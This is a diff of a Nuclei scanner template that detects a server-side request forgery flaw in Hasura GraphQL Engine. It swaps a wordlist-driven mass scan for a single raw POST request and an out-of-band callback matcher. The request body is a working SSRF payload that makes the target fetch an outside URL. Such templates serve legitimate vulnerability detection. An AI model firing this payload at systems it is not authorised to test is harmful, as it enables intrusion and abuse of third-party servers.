@@ -1,28 +1,23 @@
 id: hasura-graphql-ssrf
+
 info:
-  name: Hasura GraphQL Engine - SSRF Side Request Forgery
+  name: Hasura GraphQL Engine - Server Side Request Forgery
   author: princechaddha
   severity: high
-  reference: https://cxsecurity.com/issue/WLB-2021040115
-  tags: hasura,ssrf
+  description: Hasura GraphQL Engine is vulnerable to SSRF( Server Side Request Forgery )
+  reference:
+    - https://cxsecurity.com/issue/WLB-2021040115
+  metadata:
+    max-request: 1
+  tags: hasura,ssrf,graphql
 
-requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
-
-    raw:
+http:
+  - raw:
       - |
         POST /v1/query HTTP/1.1
-        Host: {{Subdomains}}
-        Content-Length: 381
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
-        content-type: application/json
+        Host: {{Hostname}}
+        Content-Type: application/json
         Accept: */*
-        Accept-Encoding: gzip, deflate
-        Accept-Language: en-US,en;q=0.9
-        Connection: close
 
         {
            "type":"bulk",
@@ -32,7 +27,7 @@ requests:
                  "args":{
                     "name":"test",
                     "definition":{
-                       "url":"https://{{Host}}.{{Port}}.{{Subdomains}}.hasura.{{MY-DOMAIN}}",
+                       "url":"https://{{interactsh-url}}",
                        "headers":[
                        ],
                        "timeout_seconds":60,
@@ -42,3 +37,15 @@ requests:
               }
            ]
         }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 400
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+# digest: 4b0a00483046022100a7f6d01d3252bce0d06a6566c774eda2dffb179cfd030fbdd229e36d8ee07ffe022100b6050c6a49e78394169df7c1e66e0bbaa9f7cdea69e7546c373dcba595e76970:922c64590222798bb761d5b6d8e72950
